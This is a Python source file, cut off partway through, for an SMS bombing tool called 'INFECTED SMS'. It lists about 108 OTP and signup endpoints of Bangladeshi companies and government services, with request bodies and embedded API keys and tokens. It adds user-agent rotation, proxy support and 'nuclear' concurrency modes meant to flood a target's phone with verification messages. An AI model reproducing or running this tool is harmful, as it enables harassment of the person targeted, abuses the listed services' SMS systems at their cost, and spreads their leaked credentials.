#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║                    ██╗███╗   ██╗███████╗███████╗ ██████╗████████╗███████╗██████╗  ║
║                    ██║████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗ ║
║                    ██║██╔██╗ ██║█████╗  █████╗  ██║        ██║   █████╗  ██║  ██║ ║
║                    ██║██║╚██╗██║██╔══╝  ██╔══╝  ██║        ██║   ██╔══╝  ██║  ██║ ║
║                    ██║██║ ╚████║██║     ██║     ╚██████╗   ██║   ███████╗██████╔╝ ║
║                    ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝      ╚═════╝   ╚═╝   ╚══════╝╚═════╝  ║
║                                                                                   ║
║                    ███████╗███╗   ███╗███████╗                                    ║
║                    ██╔════╝████╗ ████║██╔════╝                                    ║
║                    ███████╗██╔████╔██║███████╗                                    ║
║                    ╚════██║██║╚██╔╝██║╚════██║                                    ║
║                    ███████║██║ ╚═╝ ██║███████║                                    ║
║                    ╚══════╝╚═╝     ╚═╝╚══════╝                                    ║
║                                                                                   ║
║                    ╔═══════════════════════════════════════════════════════════╗  ║
║                    ║  💀 ULTIMATE SMS BOMBER - 108+ APIs EDITION 💀            ║  ║
║                    ║  ⚡ INFECTED SMS v5.0 - MAXIMUM POWER ⚡                  ║  ║
║                    ╚═══════════════════════════════════════════════════════════╝  ║
║                                                                                   ║
║                    👨‍💻 DEVELOPED BY MOHAMMAD ALAMIN                              ║
║                    📱 TIKTOK: @mr_virus_apk                                       ║
║                    📘 FACEBOOK: Mohammad Alamin                                   ║
║                    📨 TELEGRAM: @mrvirus460                                       ║
║                    💻 GITHUB: Alaminvaihero                                       ║
║                                                                                   ║
║                    🔥 STAY CONNECTED FOR MORE! 🔥                                 ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import aiohttp
import json
import ssl
import time
import random
import sys
import os
import signal
import platform
import socket
import datetime
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional, Tuple
from itertools import cycle

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============== CONFIGURATION ==============
class Config:
    MODES = {
        'stealth': {'name': '👻 STEALTH', 'concurrency': 10, 'delay': (2, 4), 'color': '\033[94m'},
        'normal': {'name': '⚡ NORMAL', 'concurrency': 25, 'delay': (1, 2), 'color': '\033[92m'},
        'aggressive': {'name': '🔥 AGGRESSIVE', 'concurrency': 60, 'delay': (0.3, 0.8), 'color': '\033[93m'},
        'ultimate': {'name': '💀 ULTIMATE', 'concurrency': 120, 'delay': (0.1, 0.3), 'color': '\033[91m'},
        'nuclear': {'name': '☢️ NUCLEAR', 'concurrency': 200, 'delay': (0, 0.1), 'color': '\033[95m'}
    }
    
    USE_PROXY = False
    PROXY_FILE = "proxies.txt"
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/134.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/133.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
    ]
    
    class Colors:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        DIM = '\033[2m'
        RESET = '\033[0m'

# ============== PROXY MANAGER ==============
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.proxy_cycle = None
        self.load_proxies()
    
    def load_proxies(self):
        if Config.USE_PROXY and os.path.exists(Config.PROXY_FILE):
            with open(Config.PROXY_FILE, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            if self.proxies:
                self.proxy_cycle = cycle(self.proxies)
                print(f"{Config.Colors.GREEN}[✓] Loaded {len(self.proxies)} proxies{Config.Colors.RESET}")
    
    def get_proxy(self):
        if self.proxies and self.proxy_cycle:
            proxy = next(self.proxy_cycle)
            return {"http": proxy, "https": proxy}
        return None

# ============== PHONE FORMATTER ==============
class PhoneFormatter:
    @staticmethod
    def format(phone: str) -> dict:
        cleaned = ''.join(filter(str.isdigit, phone))
        if cleaned.startswith('880'):
            cleaned = cleaned[3:]
        elif cleaned.startswith('88'):
            cleaned = cleaned[2:]
        elif cleaned.startswith('0'):
            cleaned = cleaned[1:]
        if not cleaned.startswith('1') or len(cleaned) < 10:
            cleaned = cleaned.zfill(10)
        return {
            'original': phone, 'cleaned': cleaned, 'with_0': f"0{cleaned}",
            'with_88': f"88{cleaned}", 'with_880': f"880{cleaned}",
            'with_plus88': f"+88{cleaned}", 'with_plus880': f"+880{cleaned}"
        }

# ============== 108 APIS FROM SMALI FILE ==============
class APIConfigs:
    """Complete 108 APIs extracted from the smali file"""
    
    APIS = [
        ("RedX Signup", "https://api.redx.com.bd:443/v1/user/signup", "POST", "with_0", '{"name":"{phone}","service":"redx","phoneNumber":"{phone}"}'),
        ("KhaasFood OTP", "https://api.khaasfood.com/api/app/one-time-passwords/token?username={phone}", "GET", "with_0", None),
        ("Bioscope Login", "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "POST", "with_plus88", '{"number":"+88{phone}"}'),
        ("Bikroy Phone Login", "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", "GET", "with_0", None),
        ("Proiojon Signup", "https://billing.proiojon.com/api/v1/auth/sign-up", "POST", "with_0", '{"name":"User","phone":"{phone}","email":"user{phone}@gmail.com","password":"password123","ref_code":""}'),
        ("BeautyBooth Signup", "https://admin.beautybooth.com.bd/api/v2/auth/signup", "POST", "with_0", '{"phone":"{phone}"}'),
        ("Medha OTP", "https://developer.medha.info/api/send-otp", "POST", "cleaned", '{"phone":"880{phone}","is_register":"1"}'),
        ("Deeptoplay Login", "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "POST", "with_plus88", '{"number":"+88{phone}"}'),
        ("Robi OTP", "https://webapi.robi.com.bd/v1/account/register/otp", "POST", "with_0", '{"phone_number":"{phone}"}'),
        ("Arogga SMS", "https://api.arogga.com/auth/v1/sms/send/", "POST", "with_0", 'mobile={phone}&fcmToken=&referral='),
        ("MyGP OTP", "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/", "POST", "cleaned", None),
        ("BDStall OTP", "https://www.bdstall.com/userRegistration/save_otp_info/", "POST", "with_0", 'UserTypeID=2&RequestType=1&Name=Md&Mobile={phone}'),
        ("BCS Exam OTP", "https://bcsexamaid.com/api/generateotp", "POST", "with_0", '{"mobile":"{phone}","softtoken":"Rifat.Admin.2022"}'),
        ("DoctorLive OTP", "https://doctorlivebd.com/api/patient/auth/otpsend", "POST", "cleaned", '{"country_code":"880","phone":"{phone}"}'),
        ("Sheba OTP", "https://accountkit.sheba.xyz/api/shoot-otp", "POST", "with_plus88", '{"phone":"+88{phone}","app_id":"8329815A6D1AE6DD","api_token":"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}'),
        ("Apex4U Login", "https://api.apex4u.com/api/auth/login", "POST", "with_0", '{"phoneNumber":"{phone}"}'),
        ("Sindabad OTP", "https://offers.sindabad.com/api/mobile-otp", "POST", "with_plus88", '{"key":"c94e67fb2a59af3b6fa21f24463b2061","phone":"+88{phone}"}'),
        ("Kirei OTP", "https://app.kireibd.com/api/v2/send-login-otp", "POST", "with_0", '{"email":"{phone}"}'),
        ("Shikho SMS", "https://api.shikho.com/auth/v2/send/sms", "POST", "with_0", '{"phone":"{phone}","type":"student","auth_type":"signup","vendor":"shikho"}'),
        ("Circle Signup", "https://reseller.circle.com.bd/api/v2/auth/signup", "POST", "with_plus88", '{"name":"+88{phone}","email_or_phone":"+88{phone}","password":"123456","password_confirmation":"123456","register_by":"phone"}'),
        ("BDTickets Auth", "https://api.bdtickets.com:20100/v1/auth", "POST", "with_plus88", '{"createUserCheck":true,"phoneNumber":"+88{phone}","applicationChannel":"WEB_APP"}'),
        ("Grameenphone OTP", "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "POST", "with_0", '{"phone":"{phone}","email":"","language":"en"}'),
        ("RFL BestBuy Login", "https://rflbestbuy.com/api/login/", "POST", "with_0", '{"company_id":"26","password2":"Riyaz@123","currency_code":"BDT","user_type":"C","email":"{phone}@gmail.com","g_id":"","lang_code":"en","operating_system":"Android","otp_verify":false,"password1":"Riyaz@123","phone":"{phone}","storefront_id":"3"}'),
        ("Chorki Login", "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile", "POST", "with_0", '{"number":"{phone}"}'),
        ("Hishab Express", "https://api.hishabexpress.com/login/status", "POST", "with_0", 'msisdn={phone}&hash=Hello'),
        ("Chorcha Auth", "https://mujib.chorcha.net/auth/check?phone={phone}", "GET", "with_0", None),
        ("Wafilife OTP", "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}", "GET", "with_0", None),
        ("Robi Account OTP", "https://webapi.robi.com.bd/v1/account/register/otp", "POST", "with_0", '{"phone_number":"{phone}"}'),
        ("Chardike OTP", "https://api.chardike.com/api/chardike-login-need", "POST", "with_0", '{"phone":"{phone}","otp_type":"login","from_request":"WEB"}'),
        ("E-TestPaper OTP", "https://dev.etestpaper.net/api/v4/auth/otp", "POST", "with_0", '{"phone":"{phone}","recaptcha":"668be73dcad2999a957ff440"}'),
        ("GPay Signup", "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup", "POST", "with_0", '{"deviceId":"35{phone}30","msisdn":"{phone}","tran_type":"OTPREQSIGNUP"}'),
        ("Applink OTP", "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", "POST", "with_880", '{"msisdn":"88{phone}"}'),
        ("Priyoshikkhaloy", "https://app.priyoshikkhaloy.com/api/user/register-login.php", "POST", "with_0", 'mobile={phone}'),
        ("Kabbik OTP", "https://api.kabbik.com/v1/auth/otpnew", "POST", "with_880", '{"msisdn":"88{phone}","currentTimeLong":"TIMESTAMP","passKey":"qOQNBtVmoTTPVmfn"}'),
        ("Salextra", "https://salextra.com.bd/customer/checkusernameavailabilityonregistration", "POST", "with_0", 'username={phone}&loginType=MOBILE'),
        ("Sundora", "https://api.sundora.com.bd/api/user/customer/", "POST", "with_plus880", '{"customer":{"email":"user{phone}@gmail.com","password":"#bUV?\'3*N#7N}.g","password_confirmation":"#bUV?\'3*N#7N}.g","phone":"+880{phone}","first_name":"User","last_name":"Test"}}'),
        ("MyGP Cinematic", "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D", "POST", "cleaned", '{"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20190827042622"}}'),
        ("Bajistar", "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}", "GET", "cleaned", None),
        ("Doctime", "https://api.doctime.com.bd/api/authenticate", "POST", "with_0", '{"contact_no":"{phone}","country_calling_code":"88"}'),
        ("Grameenphone FI", "https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", "with_0", 'msisdn={phone}'),
        ("Meenabazar", "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login", "POST", "with_0", None),
        ("Medeasy", "https://api.medeasy.health/api/send-otp/+88{phone}/", "GET", "cleaned", None),
        ("Iqra Live", "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}", "GET", "with_0", None),
        ("Chokrojan", "https://chokrojan.com/api/v1/passenger/login/mobile", "POST", "with_0", '{"mobile_number":"{phone}","otp_token":"826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"}'),
        ("Shomvob", "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", "POST", "with_0", '{"phone":"88{phone}"}'),
        ("RedX Signup 2", "https://api.redx.com.bd/v1/user/signup", "POST", "with_0", '{"name":"User","phoneNumber":"{phone}","service":"redx"}'),
        ("MyGP Send OTP", "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/", "POST", "cleaned", None),
        ("BDJobs", "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", "POST", "with_0", '{"firstName":"User","lastName":"","gender":"M","email":"user{phone}@gmail.com","userName":"{phone}","password":"Password@123","confirmPassword":"Password@123","mobile":"{phone}","countryCode":"88"}'),
        ("Ultimate Organic Register", "https://ultimateasiteapi.com/api/register-customer", "POST", "cleaned", '{"customer_name":"User","customer_password":"12345678","customer_password_confirmation":"12345678","customer_email":"{phone}@gmail.com","customer_contact":"{phone}","customer_dob":"2000-01-01","customer_gender":"male"}'),
        ("Ultimate Organic Forget", "https://ultimateasiteapi.com/api/forget-customer-password", "POST", "with_0", '{"user_input":"{phone}"}'),
        ("Foodaholic", "https://foodaholic.com.bd/api/v1/auth/login-otp", "POST", "with_plus88", '{"phone":"+88{phone}"}'),
        ("KFC BD", "https://api.kfcbd.com/register", "POST", "with_0", '{"name":"User","email":"user{phone}@gmail.com","mobile":"{phone}","device_token":"test","otp":null}'),
        ("GP Offer OTP", "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp", "POST", "with_0", '{"msisdn":"{phone}"}'),
        ("Eonbazar Register", "https://app.eonbazar.com/api/auth/register", "POST", "with_0", '{"mobile":"{phone}","name":"User Test","password":"Password123","email":"user{phone}@gmail.com"}'),
        ("Eat-Z", "https://api.eat-z.com/auth/customer/app-connect", "POST", "with_0", '{"username":"+880{phone}"}'),
        ("Osudpotro", "https://api.osudpotro.com/api/v1/users/send_otp", "POST", "cleaned", '{"mobile":"+88-{phone}","deviceToken":"web","language":"en","os":"web"}'),
        ("Kormi24", "https://api.kormi24.com/graphql", "POST", "with_0", '{"operationName":"sendOTP","variables":{"type":1,"mobile":"{phone}","hash":"c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180"},"query":"mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename } }"}'),
        ("Weblogin GP", "https://weblogin.grameenphone.com/backend/api/v1/otp", "POST", "with_0", 'msisdn={phone}'),
        ("Shwapno", "https://www.shwapno.com/api/auth", "POST", "with_plus88", '{"phoneNumber":"+88{phone}"}'),
        ("Quizgiri", "https://developer.quizgiri.xyz:443/api/v2.0/send-otp", "POST", "with_0", '{"phone":"{phone}","country_code":"+880"}'),
        ("Banglalink MyBL", "https://myblapi.banglalink.net/api/v1/send-otp", "POST", "with_0", '{"phone":"{phone}"}'),
        ("Walton Plaza", "https://api.waltonplaza.com.bd/graphql", "POST", "with_0", '{"operationName":"createCustomerOtp","variables":{"auth":{"countryCode":"880","deviceUuid":"test-device","phone":"{phone}"},"device":null},"query":"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message result { id __typename } statusCode __typename } }"}'),
        ("PBS", "https://apialpha.pbs.com.bd/api/OTP/generateOTP", "POST", "with_0", '{"userPhone":"{phone}","otp":""}'),
        ("Aarong", "https://mcprod.aarong.com/graphql", "POST", "cleaned", '{"query":"mutation generateCustomerToken($mobile_number: String!) { generateCustomerToken(mobile_number: $mobile_number type: \"mobile_number\") { token } }","variables":{"mobile_number":"{phone}"}}'),
        ("Arogga App", "https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33", "POST", "with_0", 'mobile={phone}&fcmToken=&referral='),
        ("Sundarban Courier", "https://api-gateway.sundarbancourierltd.com/graphql", "POST", "with_0", '{"operationName":"CreateAccessToken","variables":{"accessTokenFilter":{"userName":"{phone}"}},"query":"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}'),
        ("QuizTime", "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", "POST", "with_0", '{"phone":"{phone}","country_code":"+88"}'),
        ("DressUp", "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp", "POST", "cleaned", '{"country_code":"+880","phone":"{phone}","type":"login","whatsapp":false}'),
        ("Ghoori Learning", "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "POST", "with_0", '{"mobile_no":"{phone}"}'),
        ("Garibook", "https://api.garibookadmin.com/api/v3/user/login", "POST", "with_0", '{"mobile":"{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}'),
        ("Fabrilife Signup", "https://fabrilifess.com/api/wp-json/wc/v2/user/register", "POST", "with_0", '{"name":"User Test","email":"{phone}@gmail.com","phone":"{phone}","password":"Password@123"}'),
        ("Fabrilife OTP", "https://fabrilifess.com/api/wp-json/wc/v2/user/phone-login/{phone}", "GET", "with_0", None),
        ("BTCL BDIA", "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1", "POST", "cleaned", 'actionType=otpSend&mobileNo={phone}'),
        ("BTCL PhoneBill Register", "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json", "POST", "with_0", '{"phoneNbr":"{phone}","email":"","OTPType":1,"userName":""}'),
        ("BTCL PhoneBill Login", "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json", "POST", "with_0", '{"OTPType":15,"userName":"{phone}","isNewPhoneOrEmail":false}'),
        ("RedX Merchant OTP", "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "POST", "with_0", '{"phoneNumber":"{phone}"}'),
        ("KhaasFood Digits", "https://www.khaasfood.com/wp-admin/admin-ajax.php", "POST", "cleaned", 'action=digits_check_mob&countrycode=+880&mobileNo={phone}&login=1&digits=1&json=1'),
        ("Robi Web OTP", "https://www.robi.com.bd/en/v1", "POST", "with_0", '[{"msisdn":"{phone}"}]'),
        ("Sindabad OTP v2", "https://offers.sindabad.com/api/mobile-otp", "POST", "with_plus88", '{"key":"9e47d1876d1d713140f10b3567f1d9e9","phone":"+88{phone}"}'),
        ("GP FI FWA OTP", "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", "POST", "with_0", '{"phone":"{phone}","email":"","language":"en"}'),
        ("Kabbik OTP v2", "https://api.kabbik.com/v1/auth/otpnew2", "POST", "with_880", '{"msisdn":"88{phone}","currentTimeLong":"TIMESTAMP","passKey":"GmIRDFRrRyoeLRYq"}'),
        ("Sundora OTP", "https://otp-backend.fly.dev/api/otp/send", "POST", "with_0", '{"phoneNumber":"{phone}"}'),
        ("Walton Plaza OTP v2", "https://waltonplaza.com.bd/api/auth/otp/create", "POST", "cleaned", '{"auth":{"countryCode":"880","deviceUuid":"device-{phone}","phone":"{phone}","type":"LOGIN"},"captchaToken":"no recapcha"}'),
        ("BTCL MyBTCL Register", "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", "POST", "with_0", '{"phoneNbr":"{phone}","email":"","OTPType":1,"userName":""}'),
        ("BTCL MyBTCL Bcare", "https://mybtcl.btcl.gov.bd/api/bcare/anonym/sendOTP.json", "POST", "with_0", '{"phoneNbr":"{phone}","email":"","OTPType":1,"userName":""}'),
        ("eCourier OTP", "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}", "GET", "with_0", None),
        ("Carrybee Merchant", "https://api-merchant.carrybee.com/api/v2/merchant/register", "POST", "with_plus880", '{"name":"User","phone_number":"+880{phone}","business_name":"W8Store"}'),
        ("Carrybee Forget", "https://api-merchant.carrybee.com/api/v2/forget-password", "POST", "with_880", '{"phone":"+880{phone}"}'),
        ("CartUp Signup", "https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup", "POST", "with_0", '{"email_or_phone":"{phone}"}'),
        ("EasyFashion Digits", "https://easyfashion.com.bd/wp-admin/admin-ajax.php", "POST", "cleaned", 'action=digits_check_mob&countrycode=+880&mobileNo={phone}&login=2&digits=1&json=1'),
        ("Sara Lifestyle", "https://prod.saralifestyle.com/api/Master/SendTokenV1", "POST", "with_0", '{"userContactNo":"{phone}","userType":"customer","actionFor":"r"}'),
        ("Electronics BD", "https://storeapi.electronicsbangladesh.com/api/auth/send-otp-for-login", "POST", "with_0", '{"loginType":"phone","mobile_number":"{phone}"}'),
        ("Esquire Electronics", "https://api.ecommerce.esquireelectronicsltd.com/api/user/check-user-for-registration", "POST", "with_0", '{"username":"{phone}"}'),
        ("Sheba Electronics", "https://admin.shebaelectronics.co/api/customer/register/send-otp", "POST", "with_0", '{"phone_number":"{phone}"}'),
        ("Sumash Tech", "https://www.sumashtech.com/api/send-otp", "POST", "with_0", '{"username":"{phone}","purpose":"registration","channel":"SMS"}'),
        ("VolthBD", "https://api.volthbd.com/api/v1/auth/registrations", "POST", "with_0", '{"firstName":"User","phoneNumber":"{phone}","password":"Password@123","affiliateRef":""}'),
        ("Rangs Shop", "https://ecom.rangs.com.bd/send-otp-code", "POST", "cleaned", '{"phone":"+880{phone}","type":1,"hash":"0c60c9dce25f6414777e0ae1c1588e144a43bfda0a6b5afe62d8db2a83bd0de0"}'),
        ("Eyecon App", "https://api.eyecon-app.com/app/cli_auth/gettransport?cli=88{phone}", "GET", "cleaned", None),
        ("Vision Emporium", "https://visionemporiumbd.com/", "POST", "cleaned", 'user_data[firstname]=User&user_data[lastname]=Test&user_data[phone]=+880{phone}&user_data[email]=user{phone}@gmail.com&user_data[password1]=Password@123&user_data[password2]=Password@123'),
        ("BASA18 SMS", "https://www.basa18.com/wps/v2/verification/sms/send", "POST", "with_0", '{"mobileNum":"{phone}","operationType":5,"countryDialingCode":null}'),
        ("PKLuck Register", "https://www.pkluck2.com/wps/verification/sms/register", "POST", "cleaned", '{"countryDialingCode":"880","mobileNo":"{phone}"}'),
        ("PKLuck NoLogin", "https://www.pkluck2.com/wps/verification/sms/noLogin", "POST", "cleaned", '{"mobileNum":"{phone}","countryDialingCode":"880"}'),
        ("8MBets Register", "https://www.8mbets.net/api/register/verify", "POST", "with_0", '{"username":"user{phone}","email":"","mobileno":"{phone}","new_password":"Password@123","confirm_new_password":"Password@123","currency":"BDT","language":"bn","langCountry":"bn-bd"}'),
        ("8MBets New Mobile", "https://www.8mbets.net/api/user/new-mobile-request", "POST", "with_0", '{"type":"verify-mobile","username":"user{phone}","language":"bn","langCountry":"bn-bd"}'),
        ("8MBets Forget TAC", "https://www.8mbets.net/api/user/request-forget-tac", "POST", "with_880", '{"type":"forget","method":"mobileno","value":"880{phone}","key":"mobileno","language":"bn","langCountry":"bn-bd"}'),
        ("Jayabaji Register", "https://www.jayabaji3.com/api/register/confirm", "POST", "cleaned", '{"mobileno":"{phone}","username":"user{phone}","firstname":"","new_password":"Password@123","confirm_new_password":"Password@123","country_code":"880","country":"BD","currency":"BDT","ref":"","language":"en","langCountry":"en-bd"}'),
        ("Jayabaji New Mobile", "https://www.jayabaji3.com/api/user/new-mobile-request", "POST", "cleaned", '{"type":"verify-mobile","username":"user{phone}","language":"en","langCountry":"en-bd"}'),
        ("Jayabaji Login TAC", "https://www.jayabaji3.com/api/user/request-login-tac", "POST", "cleaned", '{"uname":"880{phone}","sendType":"mobile","country_code":"880","currency":"BDT","mobileno":"{phone}","language":"en","langCountry":"en-bd"}')
    ]
    
    @staticmethod
    def get_all_apis():
        return APIConfigs.APIS

# ============== BANNER ==============
class Banner:
    @staticmethod
    def show():
        banner = f"""
{Config.Colors.YELLOW}{Config.Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║                    ██╗███╗   ██╗███████╗███████╗ ██████╗████████╗███████╗██████╗  ║
║                    ██║████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗ ║
║                    ██║██╔██╗ ██║█████╗  █████╗  ██║        ██║   █████╗  ██║  ██║ ║
║                    ██║██║╚██╗██║██╔══╝  ██╔══╝  ██║        ██║   ██╔══╝  ██║  ██║ ║
║                    ██║██║ ╚████║██║     ██║     ╚██████╗   ██║   ███████╗██████╔╝ ║
║                    ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝      ╚═════╝   ╚═╝   ╚══════╝╚═════╝  ║
║                                                                                   ║
║                    ███████╗███╗   ███╗███████╗                                    ║
║                    ██╔════╝████╗ ████║██╔════╝                                    ║
║                    ███████╗██╔████╔██║███████╗                                    ║
║                    ╚════██║██║╚██╔╝██║╚════██║                                    ║
║                    ███████║██║ ╚═╝ ██║███████║                                    ║
║                    ╚══════╝╚═╝     ╚═╝╚══════╝                                    ║
║                                                                                   ║
║                    ╔═══════════════════════════════════════════════════════════╗  ║
║                    ║  💀 ULTIMATE SMS BOMBER - 108+ APIs EDITION 💀            ║  ║
║                    ║  ⚡ INFECTED SMS v5.0 - MAXIMUM POWER ⚡                  ║  ║
║                    ╚═══════════════════════════════════════════════════════════╝  ║
║                                                                                   ║
║                    👨‍💻 DEVELOPED BY MOHAMMAD ALAMIN                              ║
║                    📱 TIKTOK: @mr_virus_apk                                       ║
║                    📘 FACEBOOK: Mohammad Alamin                                   ║
║                    📨 TELEGRAM: @mrvirus460                                       ║
║                    💻 GITHUB: Alaminvaihero                                       ║
║                                                                                   ║
║                    🔥 STAY CONNECTED FOR MORE! 🔥                                 ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
{Config.Colors.RESET}"""
        print(banner)

# ============== STATS ==============
class Stats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.start_time = None
    
    def reset(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.start_time = time.time()
    
    def add_result(self, success: bool):
        self.total += 1
        if success:
            self.success += 1
        else:
            self.failed += 1
    
    def get_rate(self):
        return (self.success / max(self.total, 1)) * 100
    
    def get_elapsed(self):
        if self.start_time:
            elapsed = time.time() - self.start_time
            return f"{int(elapsed//60)}m {int(elapsed%60)}s"
        return "0m 0s"

# ============== MAIN BOMBER ==============
class InfectedSMS:
    def __init__(self):
        self.stats = Stats()
        self.running = True
        self.paused = False
        self.proxy_manager = ProxyManager()
        self.current_mode = 'normal'
        self.current_task = None
        
    def setup_handlers(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        try:
            signal.signal(signal.SIGTSTP, self.pause_handler)
        except:
            pass
    
    def signal_handler(self, signum, frame):
        self.running = False
        if self.current_task:
            self.current_task.cancel()
        print(f"\n\n{Config.Colors.YELLOW}[!] STOPPING INFECTED SMS...{Config.Colors.RESET}")
        self.show_final_stats()
        sys.exit(0)
    
    def pause_handler(self, signum, frame):
        self.paused = not self.paused
        status = "PAUSED" if self.paused else "RESUMED"
        color = Config.Colors.YELLOW if self.paused else Config.Colors.GREEN
        print(f"\n{color}[{status}]{Config.Colors.RESET}")
    
    def show_live_stats(self):
        return f"{Config.Colors.CYAN}[{Config.Colors.WHITE}{self.stats.total}{Config.Colors.CYAN}] {Config.Colors.GREEN}✓{Config.Colors.WHITE}{self.stats.success} {Config.Colors.RED}✗{Config.Colors.WHITE}{self.stats.failed} {Config.Colors.YELLOW}📈{self.stats.get_rate():.0f}% {Config.Colors.CYAN}⏱{self.stats.get_elapsed()}{Config.Colors.RESET}"
    
    def show_final_stats(self):
        print(f"\n{Config.Colors.CYAN}{'='*60}{Config.Colors.RESET}")
        print(f"{Config.Colors.YELLOW}{Config.Colors.BOLD}📊 FINAL STATISTICS{Config.Colors.RESET}")
        print(f"{Config.Colors.CYAN}{'='*60}{Config.Colors.RESET}")
        print(f"{Config.Colors.GREEN}✅ Total Requests: {self.stats.total}{Config.Colors.RESET}")
        print(f"{Config.Colors.GREEN}✅ Successful: {self.stats.success}{Config.Colors.RESET}")
        print(f"{Config.Colors.RED}❌ Failed: {self.stats.failed}{Config.Colors.RESET}")
        print(f"{Config.Colors.YELLOW}📈 Success Rate: {self.stats.get_rate():.1f}%{Config.Colors.RESET}")
        print(f"{Config.Colors.YELLOW}⏱️  Time Elapsed: {self.stats.get_elapsed()}{Config.Colors.RESET}")
        print(f"{Config.Colors.CYAN}{'='*60}{Config.Colors.RESET}")
    
    def get_headers(self):
        return {
            "User-Agent": random.choice(Config.USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Content-Type": "application/json"
        }
    
    def format_body(self, body_template: str, phone_value: str, phone_data: dict) -> str:
        if body_template is None:
            return None
        body = body_template.replace("{phone}", phone_data['cleaned'])
        body = body.replace("{token}", "zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH")
        body = body.replace('"TIMESTAMP"', str(int(time.time() * 1000)))
        return body
    
    async def send_request(self, session, api, phone_data):
        name, url_template, method, phone_format, body_template = api
